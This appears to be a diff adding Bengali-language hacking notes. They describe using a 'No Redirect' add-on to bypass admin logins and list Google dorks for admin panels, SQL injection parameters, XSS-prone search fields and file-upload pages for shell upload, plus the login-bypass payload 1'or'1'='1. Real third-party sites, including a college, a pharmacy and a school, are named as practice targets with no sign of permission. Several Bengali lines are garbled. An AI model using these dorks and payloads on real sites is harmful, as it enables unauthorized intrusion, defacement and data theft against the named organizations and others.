@@ -1,0 +1,148 @@
+No Redirect এড-অন্স টি কাজ করার জন্য শর্ত ২টি -
+ক) ঐ সাইট এ No Redirect এড-অন্স দিয়ে ট্রাই করা যাবে যে সকল সাইটের URL এ ‍site name(website name. net or .com or org or com.in or....) এর পর /admin বা /administrator থাকবে এমন কোন লিংক।
+এবং
+খ) সেই লিংকে ক্লিক করলে অন্য কোন লিংকে যদি সাইট রি-ডাইরেক্ট করে যায় (মানে আমি দিলাম www.ahaque .com/admin/menu.php কিন্তু URL এ লিংক চলে অসলো www.ahaque .com/login.php)
+তাহলেই বুঝতে হবে এই সাইটে নো-রিডাইরেক্ট বাগ আছে এবং শুধুমাত্র এই রকম সাইটেই আমরা ট্রাই করতে পারি।
+এই সকল সাইট পাবো কেমন করে?
+প্রথম দিনে মনে আছে আমরা কিছু ডর্ক দিয়ে এডমিন প্যানেল সাইট খুঁজে ছিলাম, সেই টাইপ ডর্ক দিয়ে খুঁজতে হবে, যাতে শর্ত নাম্বার ”ক” ফুলফিল করে(মানে সাইটে /admin বা /administrator থাকে।
+
+
+1: intitle:"index" of "admin" site:
+2: intitle:"index" of "admin" "framework" site:.in
+3: intitle:"index" of "admin" "pdf" site:
+4: intitle:"index" of "admin" "gallery" site:
+5: intitle:"index" of "admin" "image" site:
+6: intitle:"index" of "admin" "upload" site:
+7: intitle:"index" of "admin" "banner" site:
+8: intitle:"index" of "admin" "file" site:
+9: intitle:"index" of "admin" "page" site:
+10: intitle:"index" of "admin" "news" site:
+11: intitle:"index" of "admin" "views" site:
+12: intitle:"index" of "admin" "include" site:
+13: intitle:"index" of "admin" "picture" site:
+14: intitle:"index" of "admin" "photos" site:
+—---------------------------------------------------------
+inurl: admin/login.php site:.com
+inurl: admin/login.php site:.in
+inurl: admin/login.php
+inurl: admin/index.php
+inurl: admin
+inurl: login.php
+
+
+inurl: login.php site:.in
+1'or'1'='1
+
+
+P-Site -  https://brahmaputradegreecollege.edu.in/dpt_login/index.php
+            https://www.online.pharmaasia.com.pk/admin/login.php
+https://www.bamesschool.com.ng/secondary/admin/login.php
+
+
+
+
+
+
+
+Some SQL Injection Dork
+php?id=
+php?cat=
+php?prodID=
+products_id=
+php?categoryid=
+php?news_id=
+php?cat_id=
+php?bookid=
+php?productid=
+php?item_id=
+php?item_id=
+এভোর্বও সোচে র্রর্ে পোর্রন, অথবো এগুর্লোর্ আর্রো কস্পকসকফ রর্ে পোর্রন, কযমনঃ
+php?id= site:.in
+php?id= site:.pk
+php?id= site:.th
+php?cat= site:.in
+php?cat= site:.pk
+php?cat= site:.com
+php?cat= site:.net
+php?cat= site:.org
+আিার দিান দেমেমফি ওরেভ্ োইরটর জনযও হরত প্ারর, দযিনঃ
+php?id= site:cacpa.in
+php?id= site:aminter.co.th
+php?id= site:daimsr.in
+php?id= site:berkeleyrecycling.org 
+
+
+
+XSS dork
+
+Practice Site: https://clemensantikvariat.dk/
+
+
+/?s= site:.in
+/search?q= site:.in
+/index.php?lang= site:.in
+/index.php?page= site:.in
+/search?query= site:.in
+/search?keyword= site:.in
+/search/?q= site:.in
+/connexion?redirect_uri= site:.in
+/?page= site:.in
+/search/?s= site:.in
+/?keywords= site:
+/search/?keyword= site:.in
+/search-results?q=
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+page_details.php?menu_id=
+gallery.php?menu_id=
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+HERE’S A LIST OF XSS DORKS XSS Dorks:
+ /?s= site: (any domain name choose) /search?q= site: (any domain name choose) /index.php?lang= site: (any domain name choose) /index.php?page= site: (any domain name choose) /search?query= site: (any domain name choose) /search?keyword= site: (any domain name choose) /search/?q= site: (any domain name choose) /connexion?redirect_uri= site: (any domain name choose) /?page= site: (any domain name choose) /search/?s= site: (any domain name choose) /?keywords= site: /search/?keyword= site: (any domain name choose) /search-results?q= inurl:".php?query=" inurl:".php?searchstring=" inurl:".php?keyword=" inurl:".php?file=" inurl:".php?years=" inurl:".php?txt=" page_details.php?menu_id= gallery.php?menu_id= inurl:".php?tag=" inurl:".php?max=" 
+
+
+
+
+shell upload website find
+intext:"choose file" "upload"
+intext:"select file" "upload"
+intext:"upload PDF"
+intext:"upload document"
+intext:"upload image"
+intext:"file upload"
+intext:"attach file"
+intext:"drop files here"
+intext:"drag and drop" "upload"
+intext:"maximum file size" "upload"
+intext:"allowed file types"
+inurl:upload "choose file"
+inurl:upload "select file"
+inurl:upload "file"
+intitle:"file upload"
+intitle:"upload document"
+MD
+"choose file" "maximum file size"
+"select file" "allowed file types"
+"drag and drop" "upload file"
+"upload PDF" "submit"
+"upload document" "browse"
+MD
+site:.in "choose file" upload
+site:.in "select file" upload
+site:.in "upload PDF"
+site:.in "upload document"
+site:.in "file upload"
+site:.in "attach file"
+site:.in "drop files here"
+site:.in "allowed file types"
+site:.in "maximum file size" upload
+site:.in inurl:upload "choose file"
+site:.in inurl:upload "select file"
